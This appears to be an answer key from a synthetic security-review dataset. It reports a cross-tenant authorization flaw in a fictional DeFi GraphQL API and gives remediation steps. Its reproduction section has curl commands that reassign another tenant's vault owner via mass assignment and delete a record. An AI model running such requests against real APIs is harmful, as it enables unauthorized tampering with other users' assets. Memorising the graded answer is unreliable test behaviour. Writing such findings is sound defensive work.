# Expected Response

## System
- Domain: Blockchain / DeFi
- System: ChainVault DeFi API
- Example ID: GQL-0085

## Priority Findings

### Finding 1: Single GraphQL Endpoint — Cross-Tenant DeFi Asset Mutation Without Per-Operation Authorization (Pattern 9.1)
**Severity:** Critical
**Category:** BOLA / GraphQL Platform

**Summary:**
Per §5.0 (Pattern 9.1 — GraphQL single endpoint vulnerabilities): All DeFi operations including sensitive mutations are accessible at one endpoint (`POST /graphql`) without per-operation authorization checks. An attacker from `tenant-9829` issued `updateResource(id: "R-2085", input: {status: "approved", ownerId: "attacker-9829a9b2"})` against a DeFi vault record owned by `tenant-a9b2`. This constitutes both unauthorized mutation (modifying another tenant's vault state) and mass assignment (injecting attacker `ownerId`) on a financial asset platform, with potential for fund misappropriation.

**Evidence from HAR:**
- Request: `POST https://api.chainvault-defi-api.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-9829`
- Mutation: `updateResource(id: "R-2085", input: {status: "approved", ownerId: "attacker-9829a9b2"}) { resourceId status }`
- Response `200 OK`; cross-tenant data: `tenantId: "tenant-a9b2"`, `sensitiveField: "CONFIDENTIAL-9829a9b2"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-9829a9b2`

**Root Cause (§4.0 RISK-GQL-085):** Single endpoint exposes all mutations; `updateResource` resolver fetches by ID only; `ownerId` mass-assignable.

## Steps to Reproduce

### Step 1 — Cross-tenant DeFi vault mutation (HAR)
```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-9829" \
  -d '{"query": "mutation { updateResource(id: \"R-2085\", input: {status: \"approved\", ownerId: \"attacker-9829a9b2\"}) { resourceId status } }"}'
```
**Vulnerable:** Modifies victim DeFi vault `R-2085`; `ownerId` poisoned to attacker. **Secure:** FORBIDDEN.

### Step 2 — Enumerate all mutations via single endpoint
```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-9829" \
  -d '{"query": "mutation { deleteResource(id: \"R-2085\") }"}'
```
**Vulnerable:** `deleteResource` also reachable at same endpoint without per-operation auth.

## Remediation
1. Per-operation authorization middleware at Apollo Server level for all mutations.
2. Resolver tenant guard on `updateResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Strip `ownerId` from `ResourceInput` — never client-writable.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
